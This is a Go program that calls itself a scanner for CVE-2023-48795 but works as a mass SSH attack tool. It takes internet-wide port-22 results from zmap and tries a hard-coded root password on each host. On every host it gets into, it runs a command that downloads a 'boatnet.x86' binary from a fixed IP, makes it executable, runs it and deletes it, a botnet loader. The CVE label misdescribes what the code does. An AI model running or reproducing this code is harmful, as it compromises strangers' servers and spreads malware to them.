package main

import (
    "bufio"
    "fmt"
    "golang.org/x/crypto/ssh"
    "os/exec"
    "sync"
    "time"
)

// SSH configuration
var (
    username   = "root"
    password   = "Vs!KMr#G3TVA"
    timeout    = 3 * time.Second // Short timeout for faster scanning
    maxThreads = 1000            // Maximum number of concurrent connections
)

// Test function for CVE-2023-48795
func CVE2023_48795(ip string, wg *sync.WaitGroup, semaphore chan struct{}) {
    defer wg.Done()
    semaphore <- struct{}{} // Control thread limit

    config := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout: timeout,
    }

    target := fmt.Sprintf("%s:22", ip)
    client, err := ssh.Dial("tcp", target, config)
    if err != nil {
        <-semaphore
        return
    }
    defer client.Close()

    fmt.Printf("[+] %s: Connection successful! Potential vulnerability detected.\n", ip)

    session, err := client.NewSession()
    if err != nil {
        fmt.Printf("[!] %s: Session creation failed: %v\n", ip, err)
        <-semaphore
        return
    }
    defer session.Close()

    // Execute command
    command := `wget http:/91.200.220.101/hiddenbin/boatnet.x86; chmod 777 *; ./boatnet.x86 boatnet.x86; rm -r boatnet.x86`

    output, err := session.CombinedOutput(command)
    if err != nil {
        fmt.Printf("[!] %s: Command error: %v\n", ip, err)
    } else {
        fmt.Printf("[+] %s: Output: %s\n", ip, string(output))
    }

    <-semaphore // Release thread slot
}

// Function to read IPs from zmap command output
func readTargetsFromZmap() ([]string, error) {
    var targets []string

    cmd := exec.Command("zmap", "-p22")
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        return nil, err
    }

    if err := cmd.Start(); err != nil {
        return nil, err
    }

    scanner := bufio.NewScanner(stdout)
    for scanner.Scan() {
        targets = append(targets, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        return nil, err
    }

    if err := cmd.Wait(); err != nil {
        return nil, err
    }

    return targets, nil
}

func main() {
    // Read IP list from zmap command output
    targets, err := readTargetsFromZmap()
    if err != nil {
        fmt.Println("[!] Could not read zmap output:", err)
        return
    }

    fmt.Printf("[*] zmap: %d targets found. Starting scan...\n", len(targets))

    // Synchronization for goroutines
    var wg sync.WaitGroup
    semaphore := make(chan struct{}, maxThreads) // Thread limit

    // Process targets
    for _, ip := range targets {
        wg.Add(1)
        go CVE2023_48795(ip, &wg, semaphore)
    }

    wg.Wait() // Wait for all operations to finish
    fmt.Println("[*] Scan completed!")
}